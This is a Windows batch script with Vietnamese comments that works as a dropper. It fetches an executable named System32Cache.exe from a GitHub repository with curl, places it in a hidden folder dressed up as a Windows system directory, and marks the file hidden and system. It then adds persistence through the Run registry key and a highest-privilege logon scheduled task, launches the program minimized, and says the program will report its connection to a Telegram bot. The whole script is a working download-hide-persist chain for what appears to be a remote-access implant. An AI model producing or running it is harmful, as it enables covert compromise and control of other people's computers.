@echo off
setlocal enabledelayedexpansion
REM ========================================
REM INSTALLER TỰ ĐỘNG - FILE .EXE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải file .exe từ GitHub
REM 2. Di chuyển vào thư mục ẩn
REM 3. Ẩn file và thư mục
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG - FILE .EXE
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
REM Token GitHub - Điền token của bạn vào đây
REM Hoặc tạo file GITHUB_TOKEN.txt trong cùng thư mục với file này
set "GITHUB_TOKEN=YOUR_GITHUB_TOKEN_HERE"
set "EXE_FILENAME=System32Cache.exe"
REM ========================================

REM Đọc token từ file nếu có (ưu tiên)
if exist "GITHUB_TOKEN.txt" (
    for /f "delims=" %%i in (GITHUB_TOKEN.txt) do set "GITHUB_TOKEN=%%i"
)

REM Kiểm tra quyền Administrator
net session >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Can quyen Administrator!
    echo Vui long chay file nay bang quyen Administrator.
    echo.
    pause
    exit /b 1
)
echo [OK] Co quyen Administrator
echo.

REM Thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"

REM Tạo thư mục cài đặt
echo [1/5] Dang tao thu muc cai dat...
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Khong the tao thu muc!
        pause
        exit /b 1
    )
)
echo [OK] Thu muc: %INSTALL_DIR%
echo.

REM Dừng process cũ nếu có
echo [2/5] Dang kiem tra process cu...
tasklist /FI "IMAGENAME eq System32Cache.exe" 2>nul | find /I "System32Cache.exe" >nul
if not errorlevel 1 (
    echo [INFO] Tim thay process cu, dang dong...
    taskkill /F /IM System32Cache.exe >nul 2>&1
    timeout /t 2 >nul 2>&1
)
echo [OK] Khong co process cu
echo.

REM Tải file .exe từ GitHub
echo [3/5] Dang tai file .exe tu GitHub...
cd /d "%INSTALL_DIR%"

REM Xóa file cũ nếu có
if exist "%EXE_FILENAME%" (
    attrib -h -s -r "%EXE_FILENAME%" >nul 2>&1
    del /f /q "%EXE_FILENAME%" >nul 2>&1
)

REM Tải file mới - thử nhiều cách
echo Dang tai %EXE_FILENAME%...

REM Kiểm tra token trước
echo [CHECK] Dang kiem tra GitHub token...
set USE_TOKEN=1
curl -s -H "Authorization: token %GITHUB_TOKEN%" https://api.github.com/user >"%INSTALL_DIR%\token_check.tmp" 2>nul
findstr /C:"Bad credentials" "%INSTALL_DIR%\token_check.tmp" >nul 2>&1
if not errorlevel 1 (
    echo [WARNING] GitHub token khong hop le hoac het han!
    echo [INFO] Thu tai khong can token (neu repo la public)...
    set USE_TOKEN=0
) else (
    echo [OK] GitHub token hop le
)
del /f /q "%INSTALL_DIR%\token_check.tmp" >nul 2>&1
echo.

REM Cách 1: Tải từ raw.githubusercontent.com (không cần token nếu public)
echo [1/4] Thu tai tu raw.githubusercontent.com...
if "%USE_TOKEN%"=="1" (
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%EXE_FILENAME%.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/dist/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
) else (
    curl -L -o "%EXE_FILENAME%.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/dist/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
)

REM Kiểm tra xem file có hợp lệ không
if exist "%EXE_FILENAME%.tmp" (
    for %%f in ("%EXE_FILENAME%.tmp") do (
        if %%~zf GTR 1048576 (
            REM Kiểm tra xem có phải file lỗi không (404, Bad credentials, etc.)
            findstr /C:"404" "%EXE_FILENAME%.tmp" >nul 2>&1
            if errorlevel 1 (
                findstr /C:"Bad credentials" "%EXE_FILENAME%.tmp" >nul 2>&1
                if errorlevel 1 (
                    echo [OK] Da tai thanh cong tu raw.githubusercontent.com
                    goto :download_success
                )
            )
        )
    )
)

REM Cách 2: Tải từ thư mục root (nếu file ở root)
echo [2/4] Thu tai tu thu muc root...
if "%USE_TOKEN%"=="1" (
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%EXE_FILENAME%.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
) else (
    curl -L -o "%EXE_FILENAME%.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
)

if exist "%EXE_FILENAME%.tmp" (
    for %%f in ("%EXE_FILENAME%.tmp") do (
        if %%~zf GTR 1048576 (
            findstr /C:"404" "%EXE_FILENAME%.tmp" >nul 2>&1
            if errorlevel 1 (
                findstr /C:"Bad credentials" "%EXE_FILENAME%.tmp" >nul 2>&1
                if errorlevel 1 (
                    echo [OK] Da tai thanh cong tu thu muc root
                    goto :download_success
                )
            )
        )
    )
)

REM Cách 3: Tải từ GitHub API (cần token)
if "%USE_TOKEN%"=="1" (
    echo [3/4] Thu tai tu GitHub API...
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -H "Accept: application/vnd.github.v3.raw" -o "%EXE_FILENAME%.tmp" "https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/contents/dist/%EXE_FILENAME%" 2>"%INSTALL_DIR%\curl_error.log"
    
    if exist "%EXE_FILENAME%.tmp" (
        for %%f in ("%EXE_FILENAME%.tmp") do (
            if %%~zf GTR 1048576 (
                findstr /C:"404" "%EXE_FILENAME%.tmp" >nul 2>&1
                if errorlevel 1 (
                    findstr /C:"Bad credentials" "%EXE_FILENAME%.tmp" >nul 2>&1
                    if errorlevel 1 (
                        echo [OK] Da tai thanh cong tu GitHub API
                        goto :download_success
                    )
                )
            )
        )
    )
)

REM Cách 4: Tải từ GitHub Release (nếu có)
echo [4/4] Thu tai tu GitHub Release...
if "%USE_TOKEN%"=="1" (
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -H "Accept: application/octet-stream" -o "%EXE_FILENAME%.tmp" "https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/releases/latest" 2>"%INSTALL_DIR%\curl_error.log"
) else (
    curl -L -H "Accept: application/octet-stream" -o "%EXE_FILENAME%.tmp" "https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/releases/latest" 2>"%INSTALL_DIR%\curl_error.log"
)

if exist "%EXE_FILENAME%.tmp" (
    for %%f in ("%EXE_FILENAME%.tmp") do (
        if %%~zf GTR 1048576 (
            findstr /C:"404" "%EXE_FILENAME%.tmp" >nul 2>&1
            if errorlevel 1 (
                findstr /C:"Bad credentials" "%EXE_FILENAME%.tmp" >nul 2>&1
                if errorlevel 1 (
                    echo [OK] Da tai thanh cong tu GitHub Release
                    goto :download_success
                )
            )
        )
    )
)

REM Nếu tất cả đều thất bại
echo [ERROR] Khong the tai file .exe tu bat ky nguon nao!
goto :download_fail

:download_success
REM Tiếp tục xử lý file đã tải thành công
goto :process_file

:download_fail
if not exist "%EXE_FILENAME%.tmp" (
    echo [ERROR] File .exe khong ton tai sau khi tai!
) else (
    echo [ERROR] File .exe khong hop le sau khi tai!
    echo.
    echo Noi dung file (co the la thong bao loi):
    type "%EXE_FILENAME%.tmp" | more
    del /f /q "%EXE_FILENAME%.tmp" >nul 2>&1
)
echo.
echo ========================================
echo HUONG DAN:
echo ========================================
echo.
echo 1. Build file .exe:
echo    - Chay BUILD_EXE.bat tren may phat trien
echo    - File se duoc tao tai: dist\System32Cache.exe
echo.
echo 2. Upload file .exe len GitHub:
echo    - Upload file dist\System32Cache.exe vao thu muc dist/
echo    - Hoac upload vao root cua repo
echo    - Hoac tao GitHub Release va upload vao do
echo.
echo 3. Neu repo la private, can GitHub token hop le:
echo    - Vao GitHub ^> Settings ^> Developer settings ^> Personal access tokens
echo    - Tao token moi voi quyen "repo"
echo    - Cap nhat token trong INSTALL_EXE.bat (dong 25)
echo.
echo 4. Chay lai INSTALL_EXE.bat
echo.
if exist "%INSTALL_DIR%\curl_error.log" (
    echo Chi tiet loi tu curl:
    type "%INSTALL_DIR%\curl_error.log"
    echo.
)
pause
exit /b 1

:process_file

REM Kiểm tra kích thước file (ít nhất 1MB)
for %%f in ("%EXE_FILENAME%.tmp") do (
    if %%~zf LSS 1048576 (
        echo [ERROR] File .exe qua nho, co the bi loi!
        type "%EXE_FILENAME%.tmp"
        del /f /q "%EXE_FILENAME%.tmp" >nul 2>&1
        pause
        exit /b 1
    )
)

REM Đổi tên file tạm thành file chính
move /y "%EXE_FILENAME%.tmp" "%EXE_FILENAME%" >nul 2>&1
if not exist "%EXE_FILENAME%" (
    echo [ERROR] Khong the tao file .exe!
    pause
    exit /b 1
)

echo [OK] Da tai file .exe thanh cong
echo.

REM Ẩn file và thư mục
echo [4/5] Dang an file va thu muc...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
attrib +h +s "%EXE_FILENAME%" >nul 2>&1
echo [OK] Da an file va thu muc
echo.

REM Thêm vào Windows Startup
echo [5/5] Dang them vao Windows Startup...

REM Thêm vào Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "System32Cache" /t REG_SZ /d "\"%INSTALL_DIR%\%EXE_FILENAME%\"" /f >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the them vao Registry, thu Task Scheduler...
) else (
    echo [OK] Da them vao Registry Startup
)

REM Thêm vào Task Scheduler (backup)
schtasks /Create /TN "System32Cache" /TR "\"%INSTALL_DIR%\%EXE_FILENAME%\"" /SC ONLOGON /F /RL HIGHEST >nul 2>&1
if not errorlevel 1 (
    echo [OK] Da them vao Task Scheduler
)
echo.

REM Khởi động ứng dụng
echo [5/5] Dang khoi dong ung dung...
start "" /min "%INSTALL_DIR%\%EXE_FILENAME%"
timeout /t 5 >nul 2>&1

REM Kiểm tra process đang chạy
echo [CHECK] Dang kiem tra process...
tasklist /FI "IMAGENAME eq System32Cache.exe" 2>nul | find /I "System32Cache.exe" >nul
if not errorlevel 1 (
    echo [OK] Ung dung da duoc khoi dong thanh cong!
    echo [OK] Process System32Cache.exe dang chay
) else (
    echo [WARNING] Khong tim thay process, thu khoi dong lai...
    timeout /t 2 >nul 2>&1
    start "" /min "%INSTALL_DIR%\%EXE_FILENAME%"
    timeout /t 3 >nul 2>&1
    tasklist /FI "IMAGENAME eq System32Cache.exe" 2>nul | find /I "System32Cache.exe" >nul
    if not errorlevel 1 (
        echo [OK] Ung dung da duoc khoi dong thanh cong!
    ) else (
        echo [WARNING] Van khong tim thay process, ung dung co the khoi dong sau
    )
)

echo.
echo ========================================
echo    CAI DAT HOAN TAT!
echo ========================================
echo.
echo [INFO] Thu muc cai dat: %INSTALL_DIR%
echo [INFO] File: %EXE_FILENAME%
echo.
echo [OK] Ung dung da duoc them vao Windows Startup
echo [OK] Ung dung se tu dong chay khi may khoi dong
echo.
echo ========================================
echo    THONG BAO QUAN TRONG
echo ========================================
echo.
echo [TELEGRAM] Ung dung se tu dong gui thong bao ket noi
echo [TELEGRAM] den Telegram trong vong 10-30 giay
echo [TELEGRAM] Vui long kiem tra Telegram de xac nhan!
echo.
echo [NOTE] Neu khong thay thong bao sau 1 phut:
echo [NOTE] - Kiem tra ket noi internet
echo [NOTE] - Kiem tra config.py (Bot Token va Chat ID)
echo [NOTE] - Xem log: %INSTALL_DIR%\temp\error.log
echo.
pause

